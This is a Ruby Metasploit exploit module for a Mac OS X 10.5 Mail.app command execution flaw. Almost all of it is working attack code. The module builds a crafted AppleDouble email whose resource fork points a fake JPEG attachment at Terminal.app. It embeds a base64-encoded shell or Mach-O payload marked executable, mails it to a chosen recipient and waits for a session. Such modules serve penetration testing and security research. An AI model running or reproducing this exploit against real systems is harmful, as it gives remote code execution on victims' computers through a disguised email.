##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	#
	# This module sends email messages via smtp
	#
	include Msf::Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mail.app Image Attachment Command Execution',
			'Description'    => %q{
				This module exploits a command execution vulnerability in the
			Mail.app application shipped with Mac OS X 10.5.0. This flaw was 
			patched in 10.4 in March of 2007, but reintroduced into the final
			release of 10.5.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  ['hdm', 'kf'],
			'Version'        => '$Revision$',
			'References'     => 
				[
				    	['CVE', '2006-0395'],
	  				['CVE', '2007-6165'],
					['OSVDB', '40875'],
					['BID', '26510'],
					['BID', '16907']
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'Payload'        =>
				{
					'Space'       => 8192,
					'DisableNops' => true,
					'BadChars'    => "",
					'Compat'      => 
						{
							'ConnectionType' => '-bind -find',
							'RequiredCmd'    => 'generic perl ruby bash telnet',
						},
				},

			'Targets'        =>
				[
					[ 'Mail.app - Command Payloads',  
						{ 
							'Platform'       => 'unix',
							'Arch'           => ARCH_CMD,
						} 
					],
					[ 'Mail.app - Binary Payloads (x86)',  
						{ 
							'Platform'       => 'osx',
							'Arch'           => ARCH_X86,
						} 
					],
					[ 'Mail.app - Binary Payloads (ppc)',  
						{ 
							'Platform'       => 'osx',
							'Arch'           => ARCH_PPC,
						} 
					],													
				],
			'DisclosureDate' => 'Mar 01 2006'
			))
			
			register_options(
				[
					OptString.new('MAILSUBJECT', [false, "The subject of the sent email"])
				], self.class)				
	end

	def autofilter
		false
	end

	def exploit
		
		exts = ['jpg']
		
		gext = exts[rand(exts.length)]
		name = rand_text_alpha(5) + ".#{gext}"
		data = rand_text_alpha(rand(32)+1)
		
		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['MAILSUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		dbl = Rex::MIME::Message.new
		dbl.header.set("Content-Type", "multipart/appledouble;\r\n    boundary=#{dbl.bound}")
		dbl.header.set("Content-Disposition", "inline")

		# AppleDouble file version 2
		# 3 entries - 'Finder Info', 'Real name', 'Resource Fork'
		# Real Name matches msf random generated 5 character name - (I cheated ala gsub)

		resfork = 
		"AAUWBwACAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAJAAAAPgAAAAoAAAADAAAASAAAAAkAAAACAAAA\r\n" + 
		"UQAABToAAAAAAAAAAAAASGVpc2UuanBnAAABAAAABQgAAAQIAAAAMgAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQA\r\n" + 
		"AAAlL0FwcGxpY2F0aW9ucy9VdGlsaXRpZXMvVGVybWluYWwuYXBwAOzs7P/s7Oz/7Ozs/+zs7P/s\r\n" + 
		"7Oz/7Ozs/+Hh4f/h4eH/4eHh/+Hh4f/h4eH/4eHh/+Hh4f/h4eH/5ubm/+bm5v/m5ub/5ubm/+bm\r\n" + 
		"5v/m5ub/5ubm/+bm5v/p6en/6enp/+np6f/p6en/6enp/+np6f/p6en/6enp/+zs7P/s7Oz/7Ozs\r\n" + 
		"/+zs7P/s7Oz/7Ozs/+zs7P/s7Oz/7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//z8/P/\r\n" + 
		"8/Pz//Pz8//z8/P/8/Pz//Pz8//z8/P/8/Pz//b29v/29vb/9vb2//b29v/29vb/9vb2//b29v/2\r\n" + 
		"9vb/+Pj4//j4+P/4+Pj/+Pj4//j4+P/4+Pj/+Pj4//j4+P/8/Pz//Pz8//z8/P/8/Pz//Pz8//z8\r\n" + 
		"/P/8/Pz//Pz8////////////////////////////////////////////////////////////////\r\n" + 
		"/////////////////////6gAAACoAAAAqAAAAKgAAACoAAAAqAAAAKgAAACoAAAAKgAAACoAAAAq\r\n" + 
		"AAAAKgAAACoAAAAqAAAAKgAAACoAAAADAAAAAwAAAAMAAAADAAAAAwAAAAMAAAADAAAAAwAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" + 
		"AAAAAQAAAAUIAAAECAAAADIAX9CsEsIAAAAcADIAAHVzcm8AAAAKAAD//wAAAAABDSF8" + "\r\n"

		fork = Rex::Text.encode_base64( Rex::Text.decode_base64(resfork).gsub("Heise.jpg",name), "\r\n" )

		cid = "<#{rand_text_alpha(rand(16)+16)}@#{rand_text_alpha(rand(16)+1)}.com>"
		
		cmd = ''
		
		if (target.arch.include?(ARCH_CMD))
			cmd = Rex::Text.encode_base64(payload.encoded, "\r\n")
		else
			bin = ''
			
			if(target.arch.index(ARCH_PPC))
				bin = Rex::Text.to_osx_ppc_macho(payload.encoded, '')
			end
			
			if(target.arch.index(ARCH_X86))
				bin = Rex::Text.to_osx_x86_macho(payload.encoded, '')
			end	
					
			cmd = Rex::Text.encode_base64(bin, "\r\n")
		end
		

		dbl.add_part(fork , "application/applefile;\r\n    name=\"#{name}\"", "base64", "inline;\r\n    filename=#{name}" )
		dbl.add_part(cmd , "image/jpeg;\r\n    x-mac-type=0;\r\n    x-unix-mode=0755;\r\n    x-mac-creator=0;\r\n    name=\"#{name}\"", "base64\r\nContent-Id: #{cid}", "inline;\r\n    filename=#{name}" )

		msg.parts << dbl

 		send_message(msg.to_s)		
		
		print_status("Waiting for a payload session (backgrounding)...")
	end
	
end
